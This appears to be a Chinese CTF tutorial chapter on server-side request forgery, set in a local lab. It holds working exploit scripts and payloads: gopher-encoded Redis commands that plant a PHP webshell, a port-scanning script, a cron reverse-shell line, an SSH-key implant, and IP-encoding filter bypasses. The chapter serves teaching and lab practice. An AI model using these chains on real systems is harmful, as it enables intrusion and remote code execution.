---
chapter: Web安全
section: SSRF
order: 610
tags:
  - CTF
  - Web安全
  - SSRF
  - 内网
publish: true
---

# W10 SSRF
## Server-Side Request Forgery

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W02-工具链实战与靶场搭建|W02]] · [[W06-文件包含|W06]]
> **本章目标**：建立 SSRF 的"借刀"模型——服务器持有内网通行证，而目的地由你的参数决定；在预览服务靶上把 `http(s)://`、`file://`、`dict://`、`gopher://` 四个协议逐个打穿，讲清 gopher 伪造任意 TCP 报文的构造方法与两层编码规则；用 gopher 对内网 Redis 完成未授权写 key 与写文件落地 webshell 的完整链；写一个经预览靶批量探测内网的脚本；掌握 IP 变体、URL 解析歧义、302 跳转三类绕过与 DNS rebinding 的原理；理解云元数据服务为何是 SSRF 的头号高危目标；最后给出协议白名单、解析后校验、禁内网段、出网最小化四层防御。

[[11-Web安全版图与Burp#3.7 SSRF：服务器有内网通行证，而它听你的|11 章 3.7]] 用一个最小双靶（`?url=` 预览服务 + 只绑 `127.0.0.1` 的内网后台）回答了"这类漏洞存在"：预览服务替你转发一次请求，内网面板的内容原样吐给站在外网的你。本章回答"这类漏洞怎么系统地打"：目的地参数能落到哪些协议上、每个协议能摸到什么、内网里哪台服务值得打、过滤怎么绕、防御怎么做。

与相邻章节的分工：`file://` 在 include 语境下的读写语义由 [[W06-文件包含|W06]] 第 4 节讲过，本章只讲它在"发请求"语境下的读取用法；"服务器替你发请求"还有两个入口——XML 实体与反序列化跳板，分别在 [[W11-XXE|W11]] 与 [[W12-PHP反序列化|W12]] 展开，本章的协议手法与内网打法在那些入口后同样适用。

[[W02-工具链实战与靶场搭建|W02]] 的靶场方法继续沿用：`php -S` 起服务、curl 手工打、每条 payload 配输出。

> [!note] 本章的实验约定
> 靶场占 9000 段：Redis 6379、预览服务（主靶）9000、"内网"后台 9001、文件服务 9002、防护版预览 9003、防御示范 9004、urllib 版预览（对照）9005、攻击者跳板 9030、元数据形状服务 9040。Redis 版本为 8.0，第 4 节有两处行为与版本直接相关，到时单独说明。curl 一律带 `--noproxy '*'`（[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑），含 payload 的查询串用 `-G --data-urlencode` 免去手工编码，URL 一律单引号包住。

## 1. 借刀模型：服务器替你发请求

内网的边界设施只做一件事：挡住"外面的机器直接连里面的机器"。但边界挡不住一件事——里面的机器自己往外发请求。==SSRF（Server-Side Request Forgery，服务端请求伪造）的全部内容就一句话：让一台有内网通行证的服务器，按你给的地址发请求==。你对目标没有通行证，服务器有；目的地写在哪里？写在它的一个参数里。

回到 [[11-Web安全版图与Burp#3.7 SSRF：服务器有内网通行证，而它听你的|11 章 3.7]] 的最小双靶：`9000` 端口是一个"URL 预览"功能——你提交一个链接，它替你抓回内容展示；`9001` 端口是一个管理后台，只监听内网地址。预览服务的第一行漏洞代码只有一处：

```php
$url = $_GET['url'] ?? '';      // 目的地完全来自参数
$data = fetch($url);            // 服务器替你去连这个地址
```

参数决定一切：`url` 指到外网站点，它就是正常的预览；指到 `127.0.0.1:9001`，它就是你的内网跳板。SSRF 的利用面由三个问题展开，本章一节一个：

| 问题 | 内容 | 节 |
| ---- | ---- | ---- |
| 目的地能写成什么 | 协议面：`http` 探端口、`file` 读文件、`dict`/`gopher` 发任意报文 | 3 |
| 内网里打谁 | Redis 未授权读写、写文件落地 | 4、5 |
| 过滤了怎么办 | IP 变体、解析歧义、302 跳转、DNS rebinding | 6 |

> [!note] 判定锚点与 11 章的区别
> 11 章的最小靶用 `urllib.request.urlopen(url)` 一行复现，本章主靶换成 PHP 的 cURL——因为==协议支持面由"谁替你发请求"决定==：urllib 不认 `gopher://`，cURL 认。同一处漏洞，换一个发起请求的函数，能打的协议清单就变了。这个差异在第 3 节是反复出现的判读依据。

## 2. 自建靶场

### 2.1 目录与服务

一个目录装全部靶：

```
labs/w10/
├── preview/index.php        ← 主靶：?url= 完全可控的预览服务
├── admin/index.php          ← "内网"管理后台
├── filesrv/index.php        ← 文件服务（含可写目录 upload/）
├── preview_filter/          ← 防护版预览：index.php 黑名单版、white.php 白名单版
├── safe_fetch.php           ← 防御示范（第 8 节）
├── preview_py.py            ← urllib 版预览（协议支持面对照）
├── redirector.py            ← 攻击者跳板（302 实验）
├── meta_mock.py             ← 元数据形状服务（第 7 节）
├── silent.py                ← 哑服务：收下连接不回话（第 3、5 节演示超时态）
├── gopher.py                ← 报文转 gopher URL 的小工具
├── redis_write.py           ← 构造"写文件四连"payload 的工具
└── probe.py                 ← 内网批量探测脚本（第 5 节）
```

三个核心靶的代码全文。主靶预览服务，`?url=` 不做任何限制，用 cURL 发起请求：

```php
<?php
// preview/index.php —— W10 主靶：?url= 完全可控，服务端用 cURL 发起请求
$url = $_GET['url'] ?? '';
if ($url === '') {
    echo "<h1>URL 预览服务</h1>";
    exit;
}
$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,     // 自动跟随 302（第 6 节的跳转实验靠它）
    CURLOPT_TIMEOUT        => 3,
]);
$data = curl_exec($ch);
echo $data === false ? "[fetch error] " . curl_error($ch) : $data;
curl_close($ch);
```

两点实现说明：请求失败时把 `curl_error` 原样回显——SSRF 是盲打为主的技术，==错误信息就是回显==，靶子把它打开便于观察每次请求死在哪一步；`CURLOPT_TIMEOUT => 3` 给每次抓取三秒上限，第 5 节判读端口状态靠它。管理后台与文件服务各是一个静态页：

```php
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

```php
<h1>FILE SERVICE</h1>
<p>upload/ is writable</p>
```

文件服务的 `upload/` 子目录权限放开（`chmod 777`），第 4 节往里写 webshell 用。启动全部服务：

```bash
cd ~/labs/w10
redis-server --port 6379 --bind 127.0.0.1 --save '' --daemonize yes \
  --enable-protected-configs local --dir ~/labs/w10
php -S 127.0.0.1:9000 -t preview &
php -S 127.0.0.3:9001 -t admin &
php -S 127.0.0.1:9002 -t filesrv &
php -S 127.0.0.1:9003 -t preview_filter &
php -S 127.0.0.1:9004 &
python3 preview_py.py &
python3 redirector.py &
python3 meta_mock.py &
python3 silent.py 127.0.0.1 9090 &
python3 silent.py 127.0.0.2 9090 &
```

> [!note] 两个绑定地址的用意
> 管理后台绑在 `127.0.0.3` 而不是 `127.0.0.1`：==`127.0.0.0/8` 整段都是环回地址==，绑在段内另一个地址上既保留"只有内网能访问"的语义，又给第 6 节的 IP 变体实验留了靶子——黑名单拦得住 `127.` 开头的字样，拦不住换算成十六进制、十进制、八进制的同一个地址。Redis 的发行版默认配置只绑 `127.0.0.1`（启动命令里显式给出），加上保护模式，天然就是"内网才可达"的形态；`--enable-protected-configs local` 的含义在第 4 节解释，没有这个参数本章的核心链走不通。

确认两组边界——正常访问与内网后台的真实地址：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9000/'
curl -s --noproxy '*' 'http://127.0.0.3:9001/'
```

输出：

```
<h1>URL 预览服务</h1>
```

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

### 2.2 正常访问与 SSRF 访问

预览服务的本职工作：抓一份外站内容回显。靶场里外站的角色由文件服务扮演：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=http://127.0.0.1:9002/'
```

输出：

```
<h1>FILE SERVICE</h1>
<p>upload/ is writable</p>
```

把 `url` 换成内网后台的地址——==预览服务不去区分"该不该去"，它只负责"去"==：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=http://127.0.0.3:9001/'
```

输出：

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

内网面板的 flag 经预览服务的响应原样回到了你手上。这台服务器是你唯一能直接对话的机器，但它能替你到达整个内网——后续所有节都在扩展"目的地"这一栏的内容。

## 3. 协议面逐个过一遍

`$data = curl_exec(curl_init($url))` 里的 `$url` 是完整的 URL，协议由前缀决定。cURL 支持的每个协议都是一条可利用的通道。本节把四个常用协议逐个打过主靶，每个协议先讲清"它发什么"，再看"它带回来什么"。

### 3.1 http://：探内网端口与路径

`http://` 是默认选项，也是内网测绘的起点。对同一个地址换端口，响应的差异直接区分端口状态：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=http://127.0.0.2:9999/'
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=http://127.0.0.1:9090/'
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=http://127.0.0.1:6379/'
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=http://127.0.0.3:9001/'
```

输出：

```
[fetch error] Failed to connect to 127.0.0.2 port 9999 after 0 ms: Could not connect to server
```

```
[fetch error] Connection timed out after 3002 milliseconds
```

```
[fetch error] Empty reply from server
```

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

四条响应正好对应四类判读，==错误长相即指纹==：

| 响应 | 端口状态 | 判读 |
| ---- | ---- | ---- |
| `Failed to connect … Connection refused` | 关闭 | 端口上没有服务，内核直接拒绝 |
| `Connection timed out` | 无响应 | 包被防火墙丢弃，或服务收下连接不回话 |
| `Empty reply from server` | 开放但非 HTTP | 连接建立成功，对方说的不是 HTTP——Redis、FTP、SMTP 这类文本协议服务常有此表现 |
| 正常内容 | 开放的 HTTP 服务 | 直接读路径 |

第三条值得多看一眼：6379 上是 Redis，收到 `GET / HTTP/1.1` 后按 Redis 协议无法解析这行报文，直接断开连接——"空回复"恰好暴露了"这里有个不说 HTTP 的服务"。对已知路径继续用 `http://` 追（`/admin`、`/console` 一类），就能在内网服务里找功能点。

### 3.2 file://：读本地文件

`file://` 让"发请求"变成"读本地文件"，三段斜杠后跟绝对路径：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=file:///etc/passwd' | head -3
```

输出：

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

读 `/etc/passwd` 一举两得：回显里有内容说明 file 通道存在，用户清单也是后续的素材（第 4 节写文件要判断权限归属，这份清单是起点）。[[W06-文件包含|W06]] 第 4 节讲的是 include 语境——那边 `file://` 是"绝对路径的正规写法"，读到的内容会被当 PHP 执行；本节的语境是"发请求"，读到的内容只回显不执行。同一个协议，==语义由接收方的处理方式决定==。

两斜杠形态是个高频坑：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=file://etc/passwd'
```

输出：

```
[fetch error] URL rejected: Bad file:// URL
```

`file://` 之后的第一段会被当主机名解析——`file://etc/passwd` 的主机是 `etc`，路径是 `/passwd`。==file URL 的路径必须三段斜杠起头==。

### 3.3 dict://：对文本协议服务发命令

dict 是一个词典查询协议（RFC 2229），它的会话就是纯文本行：连上、发命令行、收文本、退出。cURL 对 `dict://host:port/命令` 的处理是==把命令行原样发到端口==。对 Redis 这类"一行一个命令"的文本协议服务，dict 成了免费探测器：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=dict://127.0.0.1:6379/INFO' | head -4
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=dict://127.0.0.1:6379/INFO' | grep -E '^(redis_version|tcp_port):'
```

输出：

```
-ERR unknown subcommand 'libcurl'. Try CLIENT HELP.
$5789
# Server
redis_version:8.0.5
```

```
redis_version:8.0.5
tcp_port:6379
```

第一行 `-ERR unknown subcommand 'libcurl'` 是 cURL 自己的握手开销：它在命令前先发了一行 `CLIENT libcurl 8.18.0` 报身份，Redis 不认这个参数格式。无碍——紧随其后的 `INFO` 命令正常执行，Redis 的版本、端口等指纹全部带出。dict 能发"一行命令"，==带参数、多行的报文就无能为力==，那是下一个协议的活。

### 3.4 gopher://：伪造任意 TCP 报文

gopher 是一个比 HTTP 更老的检索协议，cURL 对它的处理方式极其朴素：==把 URL 路径里的内容解码成原始字节，原样发到 `host:port`==。报文内容从此完全由你决定——[[10-网络协议基础|10 章]]里"应用层协议就是约定好的字节序列"，gopher 让你亲手写这串字节。对 Redis，就是伪造 RESP 报文。

先看 RESP（Redis 序列化协议）的最小规则。一条命令是"数组"，格式为：

```
*<参数个数>\r\n
$<参数1字节长>\r\n<参数1>\r\n
$<参数2字节长>\r\n<参数2>\r\n
...
```

`PING` 只有一个参数：`*1\r\n$4\r\nPING\r\n`。手工数长度容易错，写一个小转换器，把命令数组转成 gopher URL（顺带完成编码）：

```python
# gopher.py —— 把任意原始 TCP 报文转成 gopher URL：inner 是 curl 直连形态，outer 是过 ?url= 参数的二次编码形态
import sys
from urllib.parse import quote

def to_gopher(host, port, raw: bytes):
    inner = f"gopher://{host}:{port}/_" + quote(raw, safe='')
    outer = quote(inner, safe='')          # 作为 ?url= 参数时再编一次
    return inner, outer

if __name__ == '__main__':
    host, port = sys.argv[1], sys.argv[2]
    raw = sys.stdin.buffer.read()
    inner, outer = to_gopher(host, port, raw)
    print('inner:', inner)
    print('outer:', 'url=' + outer)
```

生成 PING 的 URL，注意工具同时给出了两种形态：

```bash
cd ~/labs/w10
printf '*1\r\n$4\r\nPING\r\n*1\r\n$4\r\nQUIT\r\n' | python3 gopher.py 127.0.0.1 6379
```

输出：

```
inner: gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A
outer: url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25244%250D%250APING%250D%250A%252A1%250D%250A%25244%250D%250AQUIT%250D%250A
```

结构拆开看：`gopher://127.0.0.1:6379/_` 之后全部是报文本体，`%0D%0A` 是 `\r\n`、`%24` 是 `$`、`%2A` 是 `*`。开头的 `_` 是 gopher 协议的条目类型字符（历史遗留），cURL 跳过它、解码后面所有内容并发到端口。先直连打一发，确认报文本身有效：

```bash
curl -s --max-time 3 --noproxy '*' 'gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A'
```

输出：

```
+PONG
+OK
```

`+PONG` 是 Redis 对 PING 的应答，`+OK` 是对 QUIT 的应答——报文通了。现在把同一个报文经预览靶转发，==这里有一个决定成败的编码细节==。直接把 inner 形态放进 `?url=`：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9000/?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A1%0D%0A%244%0D%0APING%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A'
```

输出：

```
[fetch error] URL rejected: Malformed input to a URL function
```

失败原因要把"解码链"数清楚：`?url=` 的值先被 PHP 解码一次（`%2A` 变回 `*`、`%0D` 变回回车），cURL 拿到的是含裸控制符的 URL，直接拒绝。而 cURL 本来还会对 gopher 路径做一次解码——==`?url=` 形态的 gopher payload 要编码两层，PHP 剥一层、cURL 剥一层，落地才是原始字节==：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9000/?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25244%250D%250APING%250D%250A%252A1%250D%250A%25244%250D%250AQUIT%250D%250A'
```

输出：

```
+PONG
+OK
```

gopher.py 的 `outer` 输出就是自动做完二次编码的形态，用 `curl "http://127.0.0.1:9000/?<outer>"` 直接粘贴即可。

> [!info]- 两处小补充
> **行内命令也能用**。Redis 除了 RESP 还接受行内命令（一行文本一条命令），所以 `gopher://…/_PING%0D%0AQUIT%0D%0A` 同样返回 `+PONG`、`+OK`——省去数 `$len` 的功夫，但参数里出现空格或多行内容时还是 RESP 稳妥。**cURL 会补一个 CRLF**。用抓包脚本记录 6379 实际收到的字节：gopher 发出的报文是 `*1\r\n$4\r\nPING\r\n\r\n`——cURL 在路径内容之后追加了一个 `\r\n` 收尾（gopher 协议要求请求以 CRLF 结束），多出的空行被 Redis 当作空命令忽略，不影响利用。

协议支持面还取决于"谁替你发请求"。把主靶换成 urllib 版（9005 端口的 `preview_py.py`，实现只有一句 `urllib.request.urlopen(url)`），三个协议重打一遍：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9005/?url=file:///etc/hostname'
curl -s --noproxy '*' 'http://127.0.0.1:9005/?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A'
curl -s --noproxy '*' 'http://127.0.0.1:9005/?url=dict://127.0.0.1:6379/INFO'
```

输出：

```
Hua-Laptop
```

```
[fetch error] <urlopen error unknown url type: gopher>
```

```
[fetch error] <urlopen error unknown url type: dict>
```

`file://` 照常读出主机名，`gopher` 与 `dict` 直接报 `unknown url type`——urllib 的处理器清单里没有它们。==打 SSRF 先认发起方==：PHP 的 cURL 覆盖本章全部四个协议，Python urllib 只有 http/https/ftp/file/data 几种，Java 的 URL 类、Go 的 http.Client 各有各的清单。题面给源码时先找 `curl_`、`urlopen`、`HttpClient` 这些发起点。

## 4. gopher 打 Redis

Redis 是 SSRF 的头号内网目标，三个原因：==部署位置在内网==（发行版的默认配置只监听 `127.0.0.1`，裸启动绑所有网卡时也靠保护模式拦外网）、==默认无密码==（保护模式只拦非环回连接，对内网来源放行）、==文本协议==（gopher 可以伪造任意命令）。三个条件在自建靶上全部成立。

### 4.1 未授权读写 key

靶上的 Redis 以 `--bind 127.0.0.1 --enable-protected-configs local` 启动。先看两个安全开关的当前值：

```bash
redis-cli -h 127.0.0.1 CONFIG GET enable-protected-configs
redis-cli -h 127.0.0.1 CONFIG GET protected-mode
```

输出：

```
1) "enable-protected-configs"
2) "local"
```

```
1) "protected-mode"
2) "yes"
```

`protected-mode yes` 是未授权访问的防线：没有密码时拒绝一切非环回来源的连接。==这条防线恰好被 SSRF 绕过==——预览服务发请求的源地址是 `127.0.0.1`，落在环回上，Redis 视其为"本机用户"。用 gopher 发 `SET ssrf1 hello`，报文按 RESP 写全，末尾放 QUIT 让 Redis 关连接（否则 cURL 干等到超时）：

```bash
cd ~/labs/w10
OUTER=$(printf '*3\r\n$3\r\nSET\r\n$5\r\nssrf1\r\n$5\r\nhello\r\n*1\r\n$4\r\nQUIT\r\n' | python3 gopher.py 127.0.0.1 6379 | grep '^outer: ' | sed 's/^outer: //')
curl -s --max-time 5 --noproxy '*' "http://127.0.0.1:9000/?$OUTER"
```

输出：

```
+OK
+OK
```

两个 `+OK` 分别是 SET 与 QUIT 的应答。GET 走同样的路：

```bash
OUTER=$(printf '*2\r\n$3\r\nGET\r\n$5\r\nssrf1\r\n*1\r\n$4\r\nQUIT\r\n' | python3 gopher.py 127.0.0.1 6379 | grep '^outer: ' | sed 's/^outer: //')
curl -s --max-time 5 --noproxy '*' "http://127.0.0.1:9000/?$OUTER"
redis-cli -h 127.0.0.1 GET ssrf1
```

输出：

```
$5
hello
+OK
```

```
"hello"
```

gopher 回显里 `$5\r\nhello` 是 GET 的批量应答（5 字节的值），`redis-cli` 从服务端复核到同一个值——==未授权写 key 成立==。能写 key 离"拿 shell"还差一步，这一步就是 4.2。

> [!warning] 响应报 reset 不等于命令没执行
> 偶发情况下 QUIT 之后的响应会变成 `[fetch error] Recv failure: Connection reset by peer`：Redis 处理完 QUIT 立即关闭连接，cURL 的最后一次读取撞上 RST。==命令此时已经执行完毕==，判成败以第二条命令（GET 或 `redis-cli` 复核）为准，不要被这条报错带偏后重复打同一发。

### 4.2 从写 key 到写文件：CONFIG SET dir + SAVE

Redis 的持久化机制会把内存数据落成 RDB 文件：落盘位置由配置 `dir` 决定，文件名由 `dbfilename` 决定，`SAVE` 命令立即触发。==位置、文件名、时机三者都能用 CONFIG SET 改==，于是"写 key"升级为"写任意路径的任意文件名"：

```text
CONFIG SET dir /目标目录
CONFIG SET dbfilename shell.php
SET payload <?php system($_GET["c"]);?>
SAVE
```

这套命令属于"受保护配置"：Redis 6 起，`dir`、`dbfilename` 这类落盘相关的参数在运行期默认禁改。靶子启动时的 `--enable-protected-configs local` 就是放开它的开关——取值 `no`（默认，谁都不能改）、`local`（仅本机连接可改）、`yes`（全部可改）。SSRF 的连接恰好来自本机，`local` 与 `yes` 对这条链等效。起一个不带开关的默认实例，这条命令会被拒绝：

```bash
redis-server --port 6390 --save '' --daemonize yes
redis-cli -p 6390 CONFIG SET dir /tmp/w10demo
redis-cli -p 6390 shutdown nosave
```

输出：

```
ERR CONFIG SET failed (possibly related to argument 'dir') - can't set protected config
```

redis_write.py 把四连命令编码成一条可粘贴的 curl 命令：

```python
# redis_write.py —— 构造"写文件四连"的 gopher payload：CONFIG SET dir / CONFIG SET dbfilename / SET / SAVE
# 用法: python3 redis_write.py [目标目录]   输出可直接粘贴的 curl 命令
import sys
from urllib.parse import quote

def resp(*args: bytes) -> bytes:
    out = b'*%d\r\n' % len(args)
    for a in args:
        out += b'$%d\r\n%s\r\n' % (len(a), a)
    return out

DIR = sys.argv[1] if len(sys.argv) > 1 else '/home/hua/labs/w10/filesrv/upload'

cmds = [
    resp(b'CONFIG', b'SET', b'dir', DIR.encode()),
    resp(b'CONFIG', b'SET', b'dbfilename', b'shell.php'),
    resp(b'SET', b'webshell', b'<?php system($_GET["c"]);?>'),
    resp(b'SAVE'),
    resp(b'QUIT'),          # 让 Redis 关闭连接，fetcher 立刻拿到完整响应
]
raw = b''.join(cmds)
inner = "gopher://127.0.0.1:6379/_" + quote(raw, safe='')
print("curl -s --noproxy '*' 'http://127.0.0.1:9000/?url=" + quote(inner, safe='') + "'")
```

目标目录选文件服务的 `upload/`——落进去的 PHP 文件能被 9002 直接解析执行。生成并执行：

```bash
cd ~/labs/w10
CMD=$(python3 redis_write.py /home/hua/labs/w10/filesrv/upload)
eval "$CMD"
```

输出：

```
+OK
+OK
+OK
+OK
+OK
```

五个 `+OK` 对应四连命令加 QUIT。看落盘的文件：

```bash
ls -l filesrv/upload/
od -c filesrv/upload/shell.php | head -5
```

输出：

```
-rw-r--r-- 1 hua hua 131 Oct 23 23:24 shell.php
```

```
0000000   R   E   D   I   S   0   0   1   2 372  \t   r   e   d   i   s
0000020   -   v   e   r 005   8   .   0   .   5 372  \n   r   e   d   i
0000040   s   -   b   i   t   s 300   @ 372 005   c   t   i   m   e 302
0000060   B   | 333   j 372  \b   u   s   e   d   -   m   e   m 302 240
0000100 343  \r  \0 372  \b   a   o   f   -   b   a   s   e 300  \0 376
```

文件写到了 `upload/shell.php`，但开头是 `REDIS0012`（RDB 魔数）加一串辅助字段——SAVE 落的是==完整的 RDB 格式==，webshell 的键值躺在文件后段。这不影响执行：PHP 只解释 `<?php` 之后的代码，之前的 RDB 二进制被当作普通文本原样输出。触发：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9002/upload/shell.php?c=id' | strings | grep uid
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

命令执行到手——从 `?url=` 参数到 shell，全程只用了一台预览服务。打完把现场还原（`CONFIG SET dir` 改回、删除键、删文件），否则后续实验会在被改过的目录里落盘。

> [!info]- 另外两条经典落地
> 写 webshell 的前提是"知道一个能被解析的目录"，还有两条不依赖 Web 目录的路线：
>
> | 落地点 | 写到哪 | 生效条件 |
> | ---- | ---- | ---- |
> | 反弹 shell 定时任务 | `dir` 设为 `/var/spool/cron/crontabs`（Debian 系）或 `/var/spool/cron`（RHEL 系），`dbfilename` 设为 `root`，值里写 `*/1 * * * * bash -i >& /攻击机/端口 0>&1` 一类的 cron 行 | Redis 进程对该目录有写权限（以 root 跑的 Redis 天然满足）；cron 服务在运行，且能容忍 RDB 二进制——cron 按行解析，二进制行报错被忽略，有效行照常执行 |
> | 写 SSH 公钥 | `dir` 设为对应用户的 `~/.ssh`，`dbfilename` 设为 `authorized_keys`，值是 `ssh-rsa AAAA…` 一行 | 知道目标用户；该用户允许公钥登录；Redis 进程对 `.ssh/` 有写权限 |
>
> 两条的共同前提都是==Redis 进程的身份够高==：以专用低权限用户（`redis`）运行的现代发行版服务，既写不进 `/root` 也写不进 `/var/spool/cron`，这两条落地只在"运维拿 root 跑 Redis"的靶上成立。判断依据就是 3.2 读到的 `/etc/passwd` 与报错信息。

> [!note] 实战里的 Redis 8 变化
> Redis 8 对"发来的不是 RESP"的连接处理更干脆：收到无法解析的字节直接断连（3.1 的 `Empty reply` 就是它）。打 Redis 前先用 dict 或 `redis-cli INFO` 认版本，4.2 的受保护配置语义与这条断连行为都随版本变化，payload 失效时先核对版本。

## 5. 内网探测自动化

手工 curl 一条条打适合定点击破，摸清内网结构要批量来。探测的全部原理在第 3.1 节已经出现：==借预览靶对每个"主机：端口"发一个 `http://` 请求，按响应差异归类==。靶场里的"超时态"由 silent.py 提供——两个收下连接、永不回话的哑服务，六行：

```python
# silent.py —— 哑服务：收下连接但永远不回话，模拟"被防火墙丢弃/无响应"的端口状态
import socket
import sys

host, port = sys.argv[1], int(sys.argv[2])
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((host, port))
srv.listen(16)
while True:
    conn, _ = srv.accept()          # 收下连接，然后什么都不做
```

probe.py 把批量探测的逻辑自动化：

```python
# probe.py —— 经预览靶批量探测内网：按响应差异分类端口状态
import time
import requests

PREVIEW = 'http://127.0.0.1:9000/'

# 三台"内网主机"各自的服务面：.1 跑着预览/文件服务/Redis，.2 是一台无服务主机
# （9090 起了一个只收不回的哑服务，用于演示超时类），.3 只开管理后台
TARGETS = {
    '127.0.0.1': [6379, 9000, 9002],
    '127.0.0.2': [9001, 9090, 6379],
    '127.0.0.3': [9001, 9000, 6379],
}

s = requests.Session()
s.trust_env = False                       # 不走系统代理，等价 curl 的 --noproxy '*'

def classify(body):
    if body.startswith('[fetch error]'):
        err = body[len('[fetch error] '):]
        if 'timed out' in err.lower():
            return 'filtered（超时：包被丢弃，或服务收下连接不回话）'
        if 'Could not connect' in err or 'Connection refused' in err:
            return 'closed  （连接被拒：端口上没有服务）'
        return 'open    （非 HTTP 服务）: ' + err.strip()[:60]
    first = body.split('\n', 1)[0].strip()
    return 'open    （HTTP）: ' + (first[:60] if first else '(空响应)')

for host, ports in TARGETS.items():
    for port in ports:
        t0 = time.perf_counter()
        try:
            r = s.get(PREVIEW, params={'url': f'http://{host}:{port}/'}, timeout=8)
            body = r.text
        except requests.RequestException as e:
            body = '[fetch error] ' + str(e)[:60]
        dt = time.perf_counter() - t0
        print(f'{host}:{port:<5} {dt*1000:7.1f} ms  {classify(body)}')
```

脚本用 [[06-Python与CTF脚本基础|06 章]]的 requests 发探测请求，`trust_env = False` 对应 curl 的 `--noproxy`。跑起来：

```bash
cd ~/labs/w10 && python3 probe.py
```

输出：

```
127.0.0.1:6379      2.3 ms  open    （非 HTTP 服务）: Empty reply from server
127.0.0.1:9000   3004.7 ms  filtered（超时：包被丢弃，或服务收下连接不回话）
127.0.0.1:9002      2.3 ms  open    （HTTP）: <h1>FILE SERVICE</h1>
127.0.0.2:9001      1.5 ms  closed  （连接被拒：端口上没有服务）
127.0.0.2:9090   3005.2 ms  filtered（超时：包被丢弃，或服务收下连接不回话）
127.0.0.2:6379      1.9 ms  closed  （连接被拒：端口上没有服务）
127.0.0.3:9001      2.2 ms  open    （HTTP）: <h1>INTERNAL ADMIN PANEL</h1>
127.0.0.3:9000      1.1 ms  closed  （连接被拒：端口上没有服务）
127.0.0.3:6379      1.4 ms  closed  （连接被拒：端口上没有服务）
```

三类状态各有耗时特征：`closed` 与 `open` 都是毫秒级，`filtered` 恰好卡在预览靶的三秒超时上——==批量探测时耗时列本身就是分类依据==，大批量扫描可以先按耗时粗分再读内容。表里有一行需要单独解释：`127.0.0.1:9000` 是预览服务探测它自己，php -S 默认单进程单线程，处理自己的探测请求时被占住到超时。==扫描时把扫描源自己排除==，否则会得到这类假"无响应"。

真实内网里把 `TARGETS` 换成网段清单（如 `10.0.0.0/24` 展开）、端口换成常见服务表，脚本结构不变。判活之后对开放端口接 3.4 的 gopher 指纹识别（Redis？MySQL？），确定打谁、怎么打。

## 6. 过滤绕过

真实站点的预览功能不会毫无防备。最常见的两层：字符串黑名单（URL 里出现内网地址字样就拒）与字符串白名单（URL 里必须出现可信域名）。两层都建在"对 URL 字符串做匹配"上，==绕过的全部思路是让字符串过得了匹配、让连接落回内网==。9003 端口的防护版预览是本章的绕过靶，黑名单版 `index.php` 的核心三行：

```php
$blacklist = ['127.0.0.1', 'localhost', '127.'];
foreach ($blacklist as $bad) {
    if (stripos($url, $bad) !== false) {
        echo "[blocked] 黑名单命中: {$bad}";
        exit;
    }
}
```

### 6.1 IP 变体：同一个地址的不同写法

IP 地址在协议栈里是 32 位整数，点分十进制只是给人看的写法。glibc 的解析器接受 inet_aton 的全部花样：十六进制、十进制整数、八进制段、省零短写。逐条打防护靶：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9003/?url=http://127.0.0.3:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9003/?url=http://127.3:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9003/?url=http://0x7F000003:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9003/?url=http://2130706435:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9003/?url=http://0177.0.0.3:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9003/?url=http://[::1]:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9003/?url=http://localhost:9001/'
